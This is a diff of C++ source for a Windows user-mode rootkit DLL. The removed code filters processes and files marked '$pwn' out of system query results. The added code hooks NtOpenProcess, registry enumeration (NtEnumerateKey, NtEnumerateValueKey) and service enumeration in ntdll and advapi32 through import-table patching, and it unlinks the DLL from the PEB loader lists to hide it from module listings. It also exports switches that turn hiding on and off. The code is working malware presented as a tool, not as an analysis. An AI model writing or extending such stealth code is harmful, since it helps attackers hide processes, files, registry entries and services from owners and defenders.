@@ -1,126 +1,120 @@
 #include <Windows.h>
 
+#include <intrin.h>
+
+#include "config.h"
+#include "hooks.h"
 #include "iat_hook.h"
-#include "win_struct.h"
 #include "rootkit.h"
-
-#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
-
-using lpNtQuerySystemInformation = NTSTATUS(WINAPI*)(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
-lpNtQuerySystemInformation OriginalNtQuerySystemInformation;
-
-using lpNtQueryDirectoryFile = NTSTATUS(WINAPI*)(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileName, BOOLEAN RestartScan);
-lpNtQueryDirectoryFile OriginalNtQueryDirectoryFile;
 
 namespace
 {
-	// Identifier used to mark every process / file that must be hidden.
-	constexpr wchar_t kHiddenToken[] = L"$pwn";
-
-	// A bounded wide string (Windows UNICODE_STRING / file name buffers are
-	// not necessarily null-terminated, so the length is always carried along).
-	struct WideName
+	PPEB GetCurrentPeb()
 	{
-		const wchar_t* lpBuffer;
-		size_t Length;
-	};
+#if defined(_M_X64)
+		return reinterpret_cast<PPEB>(__readgsqword(0x60));
+#else
+		return reinterpret_cast<PPEB>(__readfsdword(0x30));
+#endif
+	}
 
-	/**
-	 * Case-insensitive search of kHiddenToken inside a bounded wide string.
-	 * \param lpName : buffer to inspect, may be nullptr.
-	 * \param length : number of characters to inspect.
-	 * \return : true if kHiddenToken is found within the bounds.
-	 */
-	bool ContainsHiddenToken(const wchar_t* lpName, const size_t length)
+	// RemoveEntryList is kernel-only, so unlink the entry manually.
+	void RemoveListEntry(LIST_ENTRY* lpEntry)
 	{
-		if (lpName == nullptr)
-			return false;
+		lpEntry->Blink->Flink = lpEntry->Flink;
+		lpEntry->Flink->Blink = lpEntry->Blink;
+	}
 
-		constexpr size_t hiddenLength = ARRAYSIZE(kHiddenToken) - 1; // exclude the null terminator
-		if (length < hiddenLength)
-			return false;
+	// Unlink the DLL from the three PEB loader lists so that it disappears
+	// from EnumProcessModules / module snapshots.
+	void HideModuleFromPeb(const HMODULE hModule)
+	{
+		const PPEB lpPeb = GetCurrentPeb();
+		if (lpPeb == nullptr || lpPeb->Ldr == nullptr)
+			return;
 
-		for (size_t i = 0; i <= length - hiddenLength; ++i)
+		LIST_ENTRY* lpHead = &lpPeb->Ldr->InLoadOrderModuleList;
+		for (LIST_ENTRY* lpLink = lpHead->Flink; lpLink != lpHead; lpLink = lpLink->Flink)
 		{
-			if (_wcsnicmp(lpName + i, kHiddenToken, hiddenLength) == 0)
-				return true;
+			const auto lpModule = CONTAINING_RECORD(lpLink, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
+			if (lpModule->DllBase != hModule)
+				continue;
+
+			RemoveListEntry(&lpModule->InLoadOrderLinks);
+			RemoveListEntry(&lpModule->InMemoryOrderLinks);
+			RemoveListEntry(&lpModule->InInitializationOrderLinks);
+			return;
 		}
-
-		return false;
 	}
 
-	/**
-	 * Walk a NextEntryOffset linked list and unlink every entry whose name
-	 * matches the hidden token, whatever the entry type is.
-	 * \param lpBuffer : head of the linked list.
-	 * \param getEntryName : accessor returning the bounded name of an entry.
-	 */
-	template <typename TEntry, typename TGetName>
-	void FilterHiddenEntries(PVOID lpBuffer, TGetName getEntryName)
+	// Restore an entry in an IAT, if the original function was captured.
+	void RestoreHook(LPCSTR lpModuleName, LPCSTR lpFunctionName, LPVOID lpOriginal, LPCSTR lpTargetModuleName = nullptr)
 	{
-		auto lpNext = static_cast<TEntry*>(lpBuffer);
-		TEntry* lpCurrent = nullptr;
+		if (lpOriginal == nullptr)
+			return;
 
-		do
-		{
-			lpCurrent = lpNext;
-			lpNext = reinterpret_cast<TEntry*>(reinterpret_cast<DWORD_PTR>(lpCurrent) + lpCurrent->NextEntryOffset);
-
-			const WideName name = getEntryName(lpNext);
-			if (ContainsHiddenToken(name.lpBuffer, name.Length))
-			{
-				if (lpNext->NextEntryOffset == 0)
-					lpCurrent->NextEntryOffset = 0;
-				else
-					lpCurrent->NextEntryOffset += lpNext->NextEntryOffset;
-
-				lpNext = lpCurrent;
-			}
-
-		} while (lpCurrent->NextEntryOffset != 0);
+		if (lpTargetModuleName != nullptr)
+			IAT::Hook(lpModuleName, lpFunctionName, lpOriginal, lpTargetModuleName);
+		else
+			IAT::Hook(lpModuleName, lpFunctionName, lpOriginal);
 	}
 }
 
-NTSTATUS WINAPI HookedNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)
+DWORD WINAPI InitHook(LPVOID lpParam)
 {
-	const NTSTATUS QueryStatus = OriginalNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
-	if (SystemInformationClass == _SYSTEM_INFORMATION_CLASS::SystemProcessInformation && QueryStatus == STATUS_SUCCESS)
+	const HMODULE hModule = static_cast<HMODULE>(lpParam);
+
+	Config::Initialize(hModule);
+
+	OriginalNtQuerySystemInformation = (pNtQuerySystemInformation) IAT::Hook("ntdll.dll", "NtQuerySystemInformation", &HookedNtQuerySystemInformation);
+	OriginalNtQueryDirectoryFile = (pNtQueryDirectoryFile) IAT::Hook("ntdll.dll", "NtQueryDirectoryFile", &HookedNtQueryDirectoryFile, "windows.storage.dll");
+	OriginalNtOpenProcess = (pNtOpenProcess) IAT::Hook("ntdll.dll", "NtOpenProcess", &HookedNtOpenProcess);
+
+	// Registry enumeration: patch the main module and advapi32 (used by the
+	// Reg* APIs) so tools like regedit are covered too.
 	{
-		FilterHiddenEntries<SYSTEM_PROCESS_INFORMATION>(SystemInformation, [](PSYSTEM_PROCESS_INFORMATION lpEntry)
-		{
-			return WideName{ lpEntry->ImageName.Buffer, lpEntry->ImageName.Length / sizeof(wchar_t) };
-		});
+		const LPVOID lpMainModule = IAT::Hook("ntdll.dll", "NtEnumerateKey", &HookedNtEnumerateKey);
+		const LPVOID lpAdvapi32 = IAT::Hook("ntdll.dll", "NtEnumerateKey", &HookedNtEnumerateKey, "advapi32.dll");
+		OriginalNtEnumerateKey = static_cast<pNtEnumerateKey>(lpMainModule != nullptr ? lpMainModule : lpAdvapi32);
+	}
+	{
+		const LPVOID lpMainModule = IAT::Hook("ntdll.dll", "NtEnumerateValueKey", &HookedNtEnumerateValueKey);
+		const LPVOID lpAdvapi32 = IAT::Hook("ntdll.dll", "NtEnumerateValueKey", &HookedNtEnumerateValueKey, "advapi32.dll");
+		OriginalNtEnumerateValueKey = static_cast<pNtEnumerateValueKey>(lpMainModule != nullptr ? lpMainModule : lpAdvapi32);
 	}
 
-	return QueryStatus;
-}
+	OriginalEnumServicesStatusExW = (pEnumServicesStatusExW) IAT::Hook("advapi32.dll", "EnumServicesStatusExW", &HookedEnumServicesStatusExW);
 
-NTSTATUS WINAPI HookedNtQueryDirectoryFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileName, BOOLEAN RestartScan)
-{
-	const NTSTATUS QueryStatus = OriginalNtQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);
-	if (FileInformationClass == FILE_INFORMATION_CLASS::FileIdBothDirectoryInformation && QueryStatus == STATUS_SUCCESS)
-	{
-		FilterHiddenEntries<FILE_ID_BOTH_DIR_INFORMATION>(FileInformation, [](PFILE_ID_BOTH_DIR_INFORMATION lpEntry)
-		{
-			return WideName{ lpEntry->FileName, lpEntry->FileNameLength / sizeof(wchar_t) };
-		});
-	}
-
-	return QueryStatus;
-}
-
-DWORD WINAPI InitHook(LPVOID)
-{
-	OriginalNtQuerySystemInformation = (lpNtQuerySystemInformation) IAT::Hook("ntdll.dll", "NtQuerySystemInformation", &HookedNtQuerySystemInformation);
-	OriginalNtQueryDirectoryFile = (lpNtQueryDirectoryFile) IAT::Hook("ntdll.dll", "NtQueryDirectoryFile", &HookedNtQueryDirectoryFile, "windows.storage.dll");
+	HideModuleFromPeb(hModule);
 
 	ExitThread(0);
 }
 
 void RemoveHookAndFreeLibrary(const HMODULE hModule)
 {
-	IAT::Hook("ntdll.dll", "NtQuerySystemInformation", (LPVOID)OriginalNtQuerySystemInformation);
-	IAT::Hook("ntdll.dll", "NtQueryDirectoryFile", (LPVOID)OriginalNtQueryDirectoryFile, "windows.storage.dll");
+	RestoreHook("ntdll.dll", "NtQuerySystemInformation", (LPVOID)OriginalNtQuerySystemInformation);
+	RestoreHook("ntdll.dll", "NtQueryDirectoryFile", (LPVOID)OriginalNtQueryDirectoryFile, "windows.storage.dll");
+	RestoreHook("ntdll.dll", "NtOpenProcess", (LPVOID)OriginalNtOpenProcess);
+	RestoreHook("ntdll.dll", "NtEnumerateKey", (LPVOID)OriginalNtEnumerateKey);
+	RestoreHook("ntdll.dll", "NtEnumerateKey", (LPVOID)OriginalNtEnumerateKey, "advapi32.dll");
+	RestoreHook("ntdll.dll", "NtEnumerateValueKey", (LPVOID)OriginalNtEnumerateValueKey);
+	RestoreHook("ntdll.dll", "NtEnumerateValueKey", (LPVOID)OriginalNtEnumerateValueKey, "advapi32.dll");
+	RestoreHook("advapi32.dll", "EnumServicesStatusExW", (LPVOID)OriginalEnumServicesStatusExW);
 
 	FreeLibraryAndExitThread(hModule, 0);
+}
+
+extern "C" __declspec(dllexport) void EnableHiding()
+{
+	Config::SetEnabled(true);
+}
+
+extern "C" __declspec(dllexport) void DisableHiding()
+{
+	Config::SetEnabled(false);
+}
+
+extern "C" __declspec(dllexport) BOOL IsHidingEnabled()
+{
+	return Config::IsEnabled() ? TRUE : FALSE;
 }
